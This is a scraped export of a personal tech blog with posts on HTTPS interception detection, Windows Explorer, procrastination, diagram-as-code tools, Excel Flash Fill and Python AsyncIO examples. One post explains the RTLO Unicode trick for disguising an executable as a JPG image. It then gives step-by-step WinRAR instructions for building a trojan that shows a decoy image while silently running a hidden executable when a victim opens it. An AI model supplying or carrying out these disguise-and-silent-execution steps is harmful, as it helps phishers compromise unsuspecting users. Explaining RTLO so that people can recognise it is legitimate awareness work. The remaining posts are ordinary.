During application development or initial configuration, a specific fingerprint (public key) of the trusted server\u0026rsquo;s certificate is embedded into the application code or configuration file. This \u0026ldquo;pinned\u0026rdquo; key acts as a reference point.\nTLS Handshake: When the application attempts to connect to the server via HTTPS, the TLS handshake commences. The server sends its digital certificate to the client for verification.\nKey Verification: The client extracts the public key from the received certificate and compares it to the pinned key stored within the application.\nConnection Decision:\nMatch: If the public keys match, the connection is considered legitimate, and encrypted communication proceeds. Mismatch: If the keys don\u0026rsquo;t match, the connection is deemed untrustworthy, indicating a potential MitM attack. The application typically throws an error and refuses to establish the connection. The benefits of TLS pinning is obvious. It checks the website fingerprint to ensure it is the real one, and add another layer of protection on top of regular security measures.\nHowever, the implementation and future upgrade can be complex. It only stops specific fakes and not all types of eavesdropping.\nThe bottom line: TLS pinning helps secure your connection, but it\u0026rsquo;s best used with other security measures.\n4. Detection # Detection is not 100%, and it it some what manual for different browsers.\n4.1 Chrome/Edge # At the address bar, click the 🔒 padlock.\nAt the menu list, select \u0026ldquo;Connection is secure\u0026rdquo;. 😆\nAt the new menu, click 🏅 certificate icon (at the top right corner).\nNow, at the General tab, check at the \u0026ldquo;Issued To\u0026rdquo; and \u0026ldquo;Issued By\u0026rdquo; details.\n4.2 Firefox # Personally, I prefer Firefox for my daily browsing.\nFirefox has an extra feature called \u0026ldquo;Automatically trust third-party root certificates\u0026rdquo;.\nOnce it is turned on, Firefox will use third-party root certificates added to your OS (by company), allowing for seamless access.\nIf you want to prevent HTTPS interception, turn it off at Settings (Privacy \u0026amp; Security).\nIt works by sending the HTTPS certificate to Mozilla for comparison. And it will block the HTTPS connection if Mozilla found a 3rd-party root certificate is used for \u0026ldquo;HTTPS interception\u0026rdquo;.\nHowever, this option could be annoying if you turn it off.\nFor me, I would turn on the option above and prefer a warning message (but allow for HTTPS interception).\nNext, configure the \u0026ldquo;Enterprise Roots preference\u0026rdquo; as below.\n# about:config security.certerrors.mitm.auto_enable_enterprise_roots = false security.enterprise_roots.auto-enabled = true security.enterprise_roots.enabled = true Now, at any time, when I browse to a HTTPS site, I can click the 🔒 padlock at the address bar, and it will show me a warning message:\nThis shows that my HTTPS connection is intercepted.\nIf you are interested to view the certificate, you can select \u0026ldquo;Connection secure\u0026rdquo;, and follow by \u0026ldquo;More information\u0026rdquo;.\n4.3 Addons # With Firefox, you can add an add-on called \u0026ldquo;Certificate Pinner\u0026rdquo;.\nThis add-on allows to selectively \u0026lsquo;pin\u0026rsquo; TLS certificates of web pages. Whenever a page is loaded and the connection is TLS encrypted, it compares the fingerprint of the presented TLS certificate to the one that is stored.\nIf they don\u0026rsquo;t match, the TLS authentication process is interrupted before any local secrets such as session cookies, passwords, etc. are sent to the server.\nA tab is opened with a warning and details of the new certificate so the user can decide if the change is genuine.\nIf so, the old fingerprint is replaced with the new fingerprint in local storage.\nA new button in the browser\u0026rsquo;s toolbar opens a pop-up menu to pin and un-pin page certificates and to get a list of all pinned certificates.\n5. Links # Mozilla: Automatically trust third-party root certificates\nMozilla: Security Warning Codes\nMozilla: CA/AddRootToFirefox\nHow to Find SSL Certificate Fingerprints\nBadSSL.com\nA handy website for demostrating bad certificate and SSL connection for web client. badssl.com at GitHub GRC Fingerprints\nResearch in detecting HTTPS interception with fingerprint. crt.sh (powered by Sectigo)\nAn online database for certificate search. crt.sh at GitHub HTTPS Interception Weakens TLS Security\nA warning message about HTTPS interception (by CISA.gov) ","date":"2024-06-27 06:39","externalUrl":null,"permalink":"/posts/https_interception/","section":"posts","summary":"HTTPS != End-to-end Encryption","title":"HTTPS Interception","type":"posts"},{"content":" Today, I (accidentally) found a way to launch old Windows Explorer on a Windows 11 OS. Good News # First, the good news is the old Windows 10 Explorer isn\u0026rsquo;t removed or replaced by new one in Windows 11.\nIn case you are like me, who prefer the details pane in old Windows Explorer (in Windows 10) to the new Windows Explorer (in Windows 11), here is a quick way:\nOpen the \u0026ldquo;Control Panel\u0026rdquo;, just win+R, and type control. Click the up arrow :arrow_up: (beside the address bar) a couple of times. You get the Windows 10 Explorer back. In my opinion, the Windows 10 Explorer has better performance over the new one.\nFYI, it is still possible if you still miss or like to try using MS Internet Explorer in Windows 11.\nAnother Way # Later, I found OldExplorer which ia a better solution.\nIt can:\nSetup a preferred starting folder. Access to the old details pane. You can make the Windows 10 Explorer the default file manager in Windows 11 with SwitchExplorer.\nLinks # OldExplorer Repo OldExplorer at GitHub. SwitchExplorer Repo SwitchExplorer at GitHub. ","date":"2024-06-22 12:24","externalUrl":null,"permalink":"/posts/win10_explorer_on_win11/","section":"posts","summary":"Launch Windows 10 Explorer in Windows 11.","title":"Old Windows Explorer","type":"posts"},{"content":"","date":"2024-06-15 06:00","externalUrl":null,"permalink":"/tags/creativity/","section":"tags","summary":"","title":"creativity","type":"tags"},{"content":"","date":"2024-06-15 06:00","externalUrl":null,"permalink":"/tags/procrastination/","section":"tags","summary":"","title":"procrastination","type":"tags"},{"content":" Procrastinating can make you more creative. Speaker: Adam Grant (Interviewed by Steve Bartlett)\nSummary # The Creative Benefits of Procrastination: Research Reveals Surprising Connection Between Delaying Tasks and Generating Innovative Ideas.\n[00:01] Procrastinating can boost creativity: - Initial disbelief challenged by PhD student's perspective. - Realization through encounter with creative procrastinator. [00:18] Procrastinators can have more creativity: - Psychologist term 'precrastinator' refers to immediate action upon having an idea. - Speaker received creative ideas while procrastinating, contrary to their usual behavior. [00:33] Procrastinators are more creative: - Research study involved testing people in various jobs. - Experiments showed correlation between procrastination and creativity. :[00:48] Procrastinators show higher creativity: - Study found procrastinators scored higher creativity on tasks. - Procrastinating a little boosts creativity compared to not procrastinating at all. [01:06] Procrastination and creativity are inversely related: - People who always procrastinated were found to be less creative. - Both extremes of procrastination, either never or always procrastinating, were associated with negative outcomes. [01:22] Procrastination can lead to increased creativity: - Procrastination allows for idea incubation and connecting patterns. - It provides distance from the problem, leading to new perspectives. [01:38] Procrastination boosts creativity when intrinsically motivated: - Reframing the task helps to see it from a broader perspective. - Procrastination only boosts creativity if intrinsically motivated. [01:54] Procrastinators may have more creativity: - Procrastination can be a result of being stuck or patient. - Putting off a decision may lead to a creative boost. Transcript # Procrastinating can make you more creative.\nI was like no, this can\u0026rsquo;t be true. I didn\u0026rsquo;t believe her. And I challenged her to test it.\nOne day, a PhD student, Jihae Shin, who came to my office. And said: \u0026ldquo;I actually think that procrastinating can make you more creative.\u0026rdquo;\nAnd Jihae is incredibly creative. And I didn\u0026rsquo;t believe her.\nI was like, \u0026ldquo;no, this can\u0026rsquo;t be true.\u0026rdquo; And she said,\u0026ldquo;really, I have my most creative ideas when I\u0026rsquo;m procrastinating.\u0026rdquo;\nAnd I didn\u0026rsquo;t believe it. Because I guess I\u0026rsquo;ve always been what psychologists call \u0026ldquo;a pre-crastinator, which is somebody who the moment you have an idea, you want to immediately put it into practice.\u0026rdquo;\nI was always excited to get things done early. And I was proud of being a good finisher.\nAnd I challenged her to test it, and so she went out and studied people in various jobs, and had them actually fill out a survey on how often they procrastinate, and then their supervisors rated their creativity.\nThen, we ran some experiments together where we tempted people to procrastinate by putting different numbers of funny YouTube videos available while they were supposed to be doing creative tasks. And we got their creativity scored by experts.\nAnd lo and behold, it turned out that people who procrastinate a little bit are more creative than people who pre-crastinate like me.\nWhy? Well we we had a few hunches at first that we tested. The first thing I wanted to know is what happened to the people who always procrastinate? And Jihae was like, \u0026ldquo;I don\u0026rsquo;t know.They never filled out my survey.\u0026rdquo;\nNo, they did eventually fill out the survey. And they were also less creative. So both extremes were bad.\nIf you never procrastinate, if you always procrastinate, you are less creative than if you sometimes do, or if you do a little.\nAnd what we found is, there are a couple of mechanisms at play, one is that procrastination can lead you to incubate ideas in the back your mind.\nYou have time to connect the dots, see patterns you didn\u0026rsquo;t see before. You end up getting some distance from the problem, and that allows you to reframe it, and look at it from a broader perspective.\nAnd so what was interesting in the data, though, was that procrastination only boosted creativity if you were intrinsically motivated by the problem. So if you were putting it off because you were bored or you didn\u0026rsquo;t care, then it didn\u0026rsquo;t stay active in the back of your mind.\nBut if you were putting it off, because you were stuck and you hadn\u0026rsquo;t figured it out yet, or you were being patient, you wanted to have 10 or 12 more ideas before you decided which one to pursue, then you actually got a creative boost.\n","date":"2024-06-15 06:00","externalUrl":null,"permalink":"/wisdom/procastination/creativity/","section":"Wisdom Bread","summary":"Procrastinating can make you more creative.","title":"Procrastination Vs Creativity","type":"wisdom"},{"content":"","date":"2024-06-13 13:04","externalUrl":null,"permalink":"/tags/ascii/","section":"tags","summary":"","title":"ascii","type":"tags"},{"content":"","date":"2024-06-13 13:04","externalUrl":null,"permalink":"/tags/diagram/","section":"tags","summary":"","title":"diagram","type":"tags"},{"content":" Creating diagrams using a text-based format (code) instead of traditional drawing tools. And this gives us the ability to manage out diagrams in a version control system alongside other project files. Why DaC? # Diagram as code (DaC) is particularly useful for creating technical diagrams, such as software architecture diagrams or system flowcharts.\nSome benefits include:\nImproved maintainability: Can easily update the code to reflect any change.\nCollaboration: Easier for teams to work on diagrams together.\nDaC Tools # Here, I\u0026rsquo;m sharing 2 DaC tools: Python/Go library and Mermaid, that I use before. Python/Go library is a more comprehensive tool and is good for creating complex network diagram. And Mermaid is a simple JS library, and is often used with Markdown document.\nAnd I\u0026rsquo;m also like to introduce a tool called ASCII flow that does the opposite, which render the output as ASCII diagram.\nDiagrams (Python/Go library) # This is a Python library that let us draw cloud system architecture in code. It was created for rapid prototyping new designs without separate diagramming tools.\nDiagrams supports visualizing infrastructure across major providers and stacks: AWS, Azure, GCP and K8s. It can model on-premise nodes, SaaS services, and even programming frameworks and languages.\nIf you prefer Go, there is Go-Diagrams too.\nMermaid # Mermaid, a Javascript library, uses markdown-style text definition to create diagrams, flowcharts and visualizations. The goal is to help documentation keep pace with developement.\nIt enables even non-programmers to create detailed visuals through the Mermaid Live Editor.\nSee the my blog post at Diagramming with Mermaid.\nASCII Flow # ASCII FLow allows us to draw diagrams visually or in text and then render the output as ASCII art. It is a client-side only eb-based application for drawing ASCII diagrams.\nThere is a online version at asciiflow.com. Or get the source at GitHub.\n","date":"2024-06-13 13:04","externalUrl":null,"permalink":"/posts/diagram_as_code/","section":"posts","summary":"Having code for aesthetics in DaC allows us to achieve a balance between control and efficiency.","title":"Diagram As Code","type":"posts"},{"content":"","date":"2024-06-13 13:04","externalUrl":null,"permalink":"/tags/gitops/","section":"tags","summary":"","title":"gitops","type":"tags"},{"content":" I\u0026rsquo;ve been working with Excel for more than 20 years, and I didn\u0026rsquo;t know this until today. ctrl + e is a powerful keyboard shortcut that activates Flash Fill. This is a tool that can significantly speed up data entry and manipulate in Excel.\nFlash Fill # Flash fill is only available in Excel 2013 and later.\nUsing Flash Fill, it automatic fills data when it senses a pattern.\nHere\u0026rsquo;s the step:\nOpen the Excel file. Manually put in the desired pattern at the first row (column Email). Goto second row (column Email), press ctrl+e, and see the magic happen. First_Name Last_Name Email John Smith john_smith@example.org Mary Lee \u0026lt;ctrl+e\u0026gt; ffff nnnnn \u0026hellip; If Flash Fill doesn\u0026rsquo;t generate the preview, it might not be turned on. You can go to Data \u0026gt; Flash Fill to run it manually, or press ctrl+e. To turn Flash Fill on, go to Tools \u0026gt; Options \u0026gt; Advanced \u0026gt; Editing Options \u0026gt; check the Automatically Flash Fill box.\nLinks # Using Flash Fill in Excel. ","date":"2024-06-01 09:24","externalUrl":null,"permalink":"/posts/flash_fill/","section":"posts","summary":"Don\u0026rsquo;t use formulas in Excel! Use ctrl+e instead.","title":"CTRL+e in Excel","type":"posts"},{"content":"","date":"2024-06-01 09:24","externalUrl":null,"permalink":"/tags/excel/","section":"tags","summary":"","title":"excel","type":"tags"},{"content":" Simply using async keyword doesn\u0026rsquo;t make your app work asynchronously.\nLet\u0026rsquo;s practice AsyncIO with different models, including aiohttp for concurrent network connections.\nIn understanding AsyncIO by examples, we demonstrate 3 examples including aiohttp to perform concurrent HTTP connections.\nThere are multiple ways to use asyncio, and here I share a few models of using them.\nAsync for-loop with asynchronous iterator Sequential async for-loop (Yes, using async wrongly may end up same as normal synchronous sequential) Async for-loop with asyncio.gather() Async for-loop with asyncio.wait() Async for-loop with asyncio.as_completed() Async for-loop with list comprehension Async for-loop with asyncio.TaskGroup() AsyncIO Models # The following code demonstrates 7 ways of using Async to do the same thing (sleep 4 diff times).\n# AsyncIO models import asyncio from timeit import default_timer as timer from rich import print as rprint class CustomIterator(): def __init__(self): self.counter = 0 def __aiter__(self): return self async def __anext__(self): if self.counter \u0026gt;= 4: raise StopAsyncIteration await asyncio.sleep(self.counter) rprint(f\u0026#39;[i][#808080]\u0026gt; task done with [ {self.counter = } ] [/#808080][/i]\u0026#39;) self.counter += 1 #return self.counter # async task async def work(t): await asyncio.sleep(t) rprint(f\u0026#39;[i][#808080]\u0026gt; task done with [ {t = } ] [/#808080][/i]\u0026#39;) # main coroutine async def main(): print(f\u0026#39;\u0026#39;) s = timer() async for w in CustomIterator(): ... e = timer() rprint(f\u0026#39;\\nUse async for-loop with Asynchronous Iterator : [{e-s:.6f} sec]\\n\u0026#39;) s = timer() for data in range(4): await work(data) e = timer() rprint(f\u0026#39;\\nSequential Asyncio For-Loop : [{e-s:.6f} sec]\\n\u0026#39;) s = timer() coros = [ work(t) for t in range(4) ] await asyncio.gather(*coros) e = timer() rprint(f\u0026#39;\\nAsync for-loop with asyncio.gather() : [{e-s:.6f} sec]\\n\u0026#39;) s = timer() tasks = [ asyncio.create_task(work(t)) for t in range(4) ] _ = await asyncio.wait(tasks) e = timer() rprint(f\u0026#39;\\nAsync for-loop with asyncio.wait() : [{e-s:.6f} sec]\\n\u0026#39;) s = timer() tasks = [ asyncio.create_task(work(t)) for t in range(4) ] for task in asyncio.as_completed(tasks): result = await task e = timer() rprint(f\u0026#39;\\nAsync for-loop with asyncio.as_completed() : [{e-s:.6f} sec]\\n\u0026#39;) s = timer() tasks = [ asyncio.create_task(work(t)) for t in range(4) ] for task in tasks: result = await task e = timer() rprint(f\u0026#39;\\nAsync for-loop with list comprehension of Tasks : [{e-s:.6f} sec]\\n\u0026#39;) s = timer() async with asyncio.TaskGroup() as group: _ = [ group.create_task(work(t)) for t in range(4) ] e = timer() rprint(f\u0026#39;\\nAsync for-loop with asyncio.TaskGroup() : [{e-s:.6f} sec]\\n\u0026#39;) asyncio.run(main()) AsyncIO Practices # Here, I practices the same way to perform 6 HTTP connections asynchronously by leveraging each model above.\n# AsyncIO Practices import aiohttp import asyncio from timeit import default_timer as timer from rich import print as rprint class CustomIterator(): def __init__(self): self.counter = 0 def __aiter__(self): return self async def __anext__(self): if self.counter \u0026gt;= 4: raise StopAsyncIteration await asyncio.sleep(self.counter) rprint(f\u0026#39;[i][#808080]\u0026gt; task done with [ {self.counter = } ] [/#808080][/i]\u0026#39;) self.counter += 1 #return self.counter # async task async def work(t): await asyncio.sleep(t) rprint(f\u0026#39;[i][#808080]\u0026gt; task done with [ {t = } ] [/#808080][/i]\u0026#39;) async def fetch(client, url): async with client.get(url) as resp: await resp.text() async def on_request_start(session, trace_config_ctx, params): trace_config_ctx.start = asyncio.get_event_loop().time() async def on_request_end(session, trace_config_ctx, params): elapsed = asyncio.get_event_loop().time() - trace_config_ctx.start rprint(f\u0026#39;[i][#808080]\u0026gt; [{params.response.status}] Completed {params.url}[/#808080][/i] [ {elapsed:.5f} s ]\u0026#39;) # main coroutine async def main(urls): print(f\u0026#39;\u0026#39;) trace_config = aiohttp.TraceConfig() trace_config.on_request_start.append(on_request_start) trace_config.on_request_end.append(on_request_end) s = timer() async for w in CustomIterator(): ... e = timer() rprint(f\u0026#39;\\nUse async for-loop with Asynchronous Iterator : [{e-s:.6f} sec]\\n\u0026#39;) s = timer() async with aiohttp.ClientSession(trace_configs=[trace_config]) as client: for url in urls: await fetch(client,url) e = timer() rprint(f\u0026#39;\\nSequential Asyncio For-Loop : [{e-s:.6f} sec]\\n\u0026#39;) s = timer() async with aiohttp.ClientSession(trace_configs=[trace_config]) as client: coros = [ fetch(client,url) for url in urls ] await asyncio.gather(*coros) e = timer() rprint(f\u0026#39;\\nAsync for-loop with asyncio.gather() : [{e-s:.6f} sec]\\n\u0026#39;) s = timer() async with aiohttp.ClientSession(trace_configs=[trace_config]) as client: tasks = [ asyncio.create_task(fetch(client,url)) for url in urls ] _ = await asyncio.wait(tasks) e = timer() rprint(f\u0026#39;\\nAsync for-loop with asyncio.wait() : [{e-s:.6f} sec]\\n\u0026#39;) s = timer() async with aiohttp.ClientSession(trace_configs=[trace_config]) as client: tasks = [ asyncio.create_task(fetch(client,url)) for url in urls ] #for task in asyncio.as_completed(tasks): # result = await task results = [ await task for task in asyncio.as_completed(tasks) ] e = timer() rprint(f\u0026#39;\\nAsync for-loop with asyncio.as_completed() : [{e-s:.6f} sec]\\n\u0026#39;) s = timer() async with aiohttp.ClientSession(trace_configs=[trace_config]) as client: tasks = [ asyncio.create_task(fetch(client,url)) for url in urls ] for task in tasks: result = await task e = timer() rprint(f\u0026#39;\\nAsync for-loop with list comprehension of Tasks : [{e-s:.6f} sec]\\n\u0026#39;) s = timer() async with aiohttp.ClientSession(trace_configs=[trace_config]) as client: async with asyncio.TaskGroup() as group: _ = [ group.create_task(fetch(client, url)) for url in urls ] e = timer() rprint(f\u0026#39;\\nAsync for-loop with asyncio.TaskGroup() : [{e-s:.6f} sec]\\n\u0026#39;) if __name__ == \u0026#34;__main__\u0026#34;: urls = [ \u0026#39;https://myseq.github.io/\u0026#39;, \u0026#39;https://securityheaders.com/\u0026#39;, \u0026#39;https://hstspreload.org/\u0026#39;, \u0026#39;https://www.isc2.org/\u0026#39;, \u0026#39;https://www.sans.org/\u0026#39;, \u0026#39;https://scotthelme.co.uk/\u0026#39; ] asyncio.run(main(urls)) ","date":"2024-05-21 01:35","externalUrl":null,"permalink":"/posts/asyncio/practices/","section":"posts","summary":"Next, let\u0026rsquo;s practice AsyncIO with different models.","title":"Learn AsyncIO by Practices","type":"posts"},{"content":" Learn AsyncIO by example, including aiothttp for concurrent network connections. In learning AsyncIO by code, we explain how to use async/await in asyncio.\nHere, we will learn AsyncIO by 3 examples, from basic to more practical use (aiohttp).\nExample_1 # In this example, task1 and task2 start almost the same time. And you will see task1 completes after 2 sec, and task 2 completes after 5 sec.\n# Example 1 - Demo asyncio with 2 tasks. import asyncio async def fetch_data(): print(\u0026#39;# [t1] start fetching....\u0026#39;) await asyncio.sleep(2) print(\u0026#39;# [t1] done fetching.\u0026#39;) return {\u0026#39;data\u0026#39;: 1} async def print_numbers(): for i in range(10): print(f\u0026#39;# [t2] {i}\u0026#39;) await asyncio.sleep(0.5) async def main(): task1 = asyncio.create_task(fetch_data()) task2 = asyncio.create_task(print_numbers()) value = await task1 print(f\u0026#39;# [t1] {value}\u0026#39;) await task2 asyncio.run(main()) # Output # [t1] start fetching.... # [t2] 0 # [t2] 1 # [t2] 2 # [t2] 3 # [t1] done fetching. # [t1] {\u0026#39;data\u0026#39;: 1} # [t2] 4 # [t2] 5 # [t2] 6 # [t2] 7 # [t2] 8 # [t2] 9 Example_2 # In this example, it demos the completion of 3 tasks. Each task will calculate and find the highest prime number. And we start the first task by 100000 and follow by 10000 and 1000.\n# Example 2 - Demo asyncio with 3 tasks. import time import asyncio def is_prime(x): return not any(x//i == x/i for i in range(x-1, 1, -1)) async def highest_prime_below(x): print(f\u0026#39;Highest prime below {x}\u0026#39;) for y in range(x-1, 0, -1): if is_prime(y): print(f\u0026#39;--\u0026gt; Highest prime below {x} is {y}.\u0026#39;) return y await asyncio.sleep(0.01) return None async def main(): p = [100000, 10000, 1000] tasks = [] t0 = time.time() for x in p: task = asyncio.create_task(highest_prime_below(x)) tasks.append(task) await asyncio.gather(*tasks) t1 = time.time() print(f\u0026#39;Took {1000*(t1-t0):.2f} ms\u0026#39;) loop = asyncio.get_event_loop() loop.run_until_complete(main()) #loop.close() # Output # Highest prime below 100000 # Highest prime below 10000 # Highest prime below 1000 # --\u0026gt; Highest prime below 1000 is 997. # --\u0026gt; Highest prime below 100000 is 99991. # --\u0026gt; Highest prime below 10000 is 9973. # Took 311.18 ms Example_3 (aiohttp) # In this example, it demos the completion of 5 network connections (tasks). It will trace the elapsed time taken for individual URL. Some tasks complete faster and some are slower.\n# Example 3 - Demo asyncio with 5 tasks [network connections] . import aiohttp import asyncio from datetime import datetime async def fetch_with(client, url): async with client.get(url) as resp: await resp.text() return f\u0026#39;# [{datetime.now():%X}] - {url} [{resp.status}]\u0026#39; async def fetch_all(client, urls): tasks = [] for url in urls: task = asyncio.create_task(fetch_with(client,url)) print(f\u0026#39;# [{datetime.now():%X}] : Added [{url}] into tasklist.\u0026#39;) tasks.append(task) print(f\u0026#39;\u0026#39;) results = await asyncio.gather(*tasks) return results async def on_request_start(session, trace_config_ctx, params): trace_config_ctx.start = asyncio.get_event_loop().time() async def on_request_end(session, trace_config_ctx, params): elapsed = asyncio.get_event_loop().time() - trace_config_ctx.start print(f\u0026#39;# [{elapsed:.5f}s] : {params.url}\u0026#39;) async def main(urls): trace_config = aiohttp.TraceConfig() trace_config.on_request_start.append(on_request_start) trace_config.on_request_end.append(on_request_end) async with aiohttp.ClientSession(trace_configs=[trace_config]) as client: data = await fetch_all(client, urls) return data if __name__ == \u0026#34;__main__\u0026#34;: urls = [ \u0026#39;https://securityheaders.com/\u0026#39;, \u0026#39;https://hstspreload.org/\u0026#39;, \u0026#39;https://www.isc2.org/\u0026#39;, \u0026#39;https://www.sans.org/\u0026#39;, \u0026#39;https://scotthelme.co.uk/\u0026#39; ] results = asyncio.run(main(urls)) print(f\u0026#39;\u0026#39;) for r in results: print(r) # Output # [21:38:50] : Added [https://securityheaders.com/] into tasklist. # [21:38:50] : Added [https://hstspreload.org/] into tasklist. # [21:38:50] : Added [https://www.isc2.org/] into tasklist. # [21:38:50] : Added [https://www.sans.org/] into tasklist. # [21:38:50] : Added [https://scotthelme.co.uk/] into tasklist. # [0.12875s] : https://scotthelme.co.uk/ # [0.93167s] : https://hstspreload.org/ # [1.08564s] : https://www.isc2.org/ # [1.39669s] : https://securityheaders.com/ # [2.20264s] : https://www.sans.org/apac/ # [21:38:51] - https://securityheaders.com/ [200] # [21:38:50] - https://hstspreload.org/ [200] # [21:38:51] - https://www.isc2.org/ [200] # [21:38:53] - https://www.sans.org/ [200] # [21:38:50] - https://scotthelme.co.uk/ [200] ","date":"2024-05-19 09:35","externalUrl":null,"permalink":"/posts/asyncio/examples/","section":"posts","summary":"Now, let\u0026rsquo;s learn AsyncIO by examples.","title":"Understanding AsyncIO by Examples","type":"posts"},{"content":"","date":"2024-05-16 12:14","externalUrl":null,"permalink":"/tags/202e/","section":"tags","summary":"","title":"202e","type":"tags"},{"content":"","date":"2024-05-16 12:14","externalUrl":null,"permalink":"/tags/exe/","section":"tags","summary":"","title":"exe","type":"tags"},{"content":" Even with file extension being shown, an executable (exe) file can look like an image file (jpeg) with a trick called RTLO. How can an executable app (.exe) look like an image file?\nUse the RTLO character as a trick in file extension.\nRTLO stands for Right-To-Left Override. It is a Unicode non-printing character used to write languages read in the right-to-left manner. It takes the input and literally just flips the text the other way round.\nA right-to-left override (RTLO) attack takes advantage of user trust in text files and changes the file extension to an “.exe” executable file. An RTLO attack often used with phishing method that tricks users into thinking that they are opening a harmless text file, but they instead open a malicious executable. RTLO Trick # Here\u0026rsquo;s the steps to make a cmd.exe displayed as cmd_exe.jpg in Windows Explorer (with file extension being shown).\nAn executable file could be .exe, .bat, .cmd, .vbs, .ps1, .com.\nFirst, get ready with an executable file (exe). You can convert a Python script to EXE (using PyInstaller) if you want. Here, I\u0026rsquo;m using Windows built-in cmd.exe as my example.\nRename the file to cmd_gpj.exe. Open Character Map. Select Advanced view. At the Go to Unicode field, type in 202E. (See the bottom bar showing as U+202E: Right-To-Left Override) Click Copy button. Back to Windows Explorer to select the file cmd_gpj.exe. Press F2 (rename), place cursor between cmd_ and gpj.exe, press ctrl-v (paste). (The filename should be shown as cmd_exe.jpg) Notes:\nSee the image.png file has file extension being shown. See the cmd_exe.jpg file has the type as Application. However, at the cmdline, it will look like:\nC:\\home\\\u0026gt;dir Directory of C:\\home 05/01/2024 11:45 PM \u0026lt;DIR\u0026gt; . 05/01/2024 11:26 PM \u0026lt;DIR\u0026gt; .. 01/20/2024 04:12 PM 323,584 cmd_ gpj.exe 05/01/2024 11:39 PM 0 image.png 2 File(s) 323,584 bytes But when I highlight, copy and paste the filename cmd_ gpj.exe to vim editor in Linux terminal, it will display as cmd_\u0026lt;202e\u0026gt;gpj.exe.\nWhat\u0026rsquo;s Next? # With the RTLO trick, we can build a trojon that looks like a image file. We need:\nAn image file (.jpg). An executable file (.exe). An icon image file (.ico). First, goto IcoConvert, and convert the image file to an icon file (.ico).\nSecond, use/open WinRAR:\nSelect Create SFX archive. Click at Advanced tab. Click at SFX options... button. Click at Setup tab. At the Setup program and Run after extraction section, put in the filenames for the image file and the executable file. (This will make image file to be opened and follow by executing the executable file once the victim opens the IMAGE) Click on the Mode tab. Select Unpack to temporary folder option. At the Silent mode, select Hide all option. Click at Text and icon tab. At the Load SFX icon from the file, browse to previously created icon image file. Click at Update tab. At the Overwrite mode, select overwrite all files option. Click OK and OK. A new SFX (.exe) should be created now.\nNext, use the RTLO trick to rename the new SFX (.exe) filename, and make it looks like a JPG file.\nHere\u0026rsquo;s the simplified flow:\nflowchart LR A1(fa:fa-image image.jpg) A2(fa:fa-gear executable.exe) A3(fa:fa-icons cover.ico) B1[fa:fa-screwdriver-wrench WinRAR] C1(fa:fa-layer-group new_sfx.exe) D1[fa:fa-gift new_sfx.jpg] A1 --\u003e B1 A2 --\u003e B1 A3 --\u003e B1 B1 --\u003e|Generate| C1 C1 --\u003e|RTLO| D1 Links # PyInstaller Manual ","date":"2024-05-16 12:14","externalUrl":null,"permalink":"/posts/executable_image/","section":"posts","summary":"Make an executable app look like an image with RTLO char (202E).","title":"Executable == Image ? ","type":"posts"},{"content":"","date":"2024-05-16 12:14","externalUrl":null,"permalink":"/tags/jpeg/","section":"tags","summary":"","title":"jpeg","type":"tags"},{"content":"","date":"2024-05-16 12:14","externalUrl":null,"permalink":"/tags/rtlo/","section":"tags","summary":"","title":"rtlo","type":"tags"},{"content":"","date":"2024-05-16 12:14","externalUrl":null,"permalink":"/tags/trick/","section":"tags","summary":"","title":"trick","type":"tags"},{"content":" Once you understand what is coroutine and task, you will understand asyncio. First thing first, asyncio cannot improve the execution speed. It is more for handling those tasks that need some waiting (I/O), such as network connection.\nImagine asyncio like brain with an event loop. And there is a list of tasks to be executed. The brain will pick the tasks from the list for execution.\nNote that, in Python asyncio, only one(1) task can be executed at any one time.\nCoroutine # There are 2 types of coroutine: coroutine function and coroutine object.\nA function that start with async def function() is a coroutine function. Anything that start with async def is called coroutine function.\nA coroutine object is what returned from a coroutine function.\n# coroutine function and coroutine object in Python async def coro_func(): await asyncio.sleep(1) coro_obj = coro_func() Executing Coroutine # In Python, we can\u0026rsquo;t execute the coroutine directly. To execute coroutine, we need to:\nEnter async mode (start the event loop). Convert coroutine into task. Basically, we use asyncio.run() to switch from synchronous mode to asynchronous mode, to start the event loop. Again, asyncio.run() will perform 2 things here:\nStart an event.loop. Then make the coroutine as the first task for event loop (brain). Here is a simple but complete Python script to switch from synchronous to asynchronous mode.\nimport asyncio # first task for event loop async def main(): print(f\u0026#39;hello\u0026#39;) await asyncio.sleep(2) # second task for event loop print(f\u0026#39;world\u0026#39;) coro_obj = main() # create coroutine object and start the coroutine/first_task asyncio.run(coro_obj) # create event loop To execute multiple tasks, we need to build a list of coroutines.\nNote that, an event loop:\nCan execute tasks that converted from coroutine. Cannot execute a coroutine directly. Multiple Tasks # After we switch to asynchronous mode, we need to create more tasks for the event loop. There is a model we can follow to build and create tasks.\nNormally, we use await method to build a simple task. And here is what happening:\nThe coroutine will be converted to a task, and inform event loop about the new task. Inform event loop to complete the new task before the existing task can continue. The existing task will yield (pause execution) and inform event loop to focus on other tasks. Anyting return from the new task will be stored to a new variable before continue (resume) on existing task. Here are 2 snippet of codes to run multiple tasks in synchronous mode, where 3 seconds delay are completed within 2 seconds.\n# Synchronous Mode 1 import asyncio import time async def go(delay, what): await asyncio.sleep(delay) return f\u0026#39;{what}({delay})\u0026#39; async def main(): \u0026#34;\u0026#34;\u0026#34; first task for event loop \u0026#34;\u0026#34;\u0026#34; time1 = time.time() print(f\u0026#39;Start: {time.strftime(\u0026#34;%X\u0026#34;)}\u0026#39;) task1 = asyncio.create_task(go(2, \u0026#39;hello\u0026#39;)) task2 = asyncio.create_task(go(1, \u0026#39;world\u0026#39;)) await task1 await task2 time2 = time.time() print(f\u0026#39;End: {time.strftime(\u0026#34;%X\u0026#34;)} ({time2-time1:.4f} sec)\u0026#39;) asyncio.run(main()) # Output below # Start: 17:19:30 # End: 17:19:32 (2.0017 sec) In synchronous mode 1 example, we use create_task() to get a return task (instead of a coroutine). Then we use await with the task to inform event loop about:\nskip the process to convert coroutine to task. take over the control to complete the task for me. # Synchronous Mode 2 import asyncio import time async def go(delay, what): await asyncio.sleep(delay) return f\u0026#39;{what}({delay})\u0026#39; async def main(): time1 = time.time() print(time.strftime(\u0026#39;%X\u0026#39;)) ret = await asyncio.gather( go(2, \u0026#39;hello\u0026#39;), go(1, \u0026#39;world\u0026#39;) ) print(ret) time2 = time.time() print(f\u0026#39;{time.strftime(\u0026#34;%X\u0026#34;)} ({time2-time1:.4f} sec)\u0026#39;) asyncio.run(main()) # Output below # 17:10:30 # [\u0026#39;hello(2)\u0026#39;, \u0026#39;world(1)\u0026#39;] # 17:10:32 (2.0018 sec) Note that, gather() is not a coroutine. In synchronous mode 2 example, gather() will return a future. And we can use await with the future later.\nUsing this method, await will\nskip the process to convert coroutine to task. take over the control to complete the task for me. To execute multiple tasks 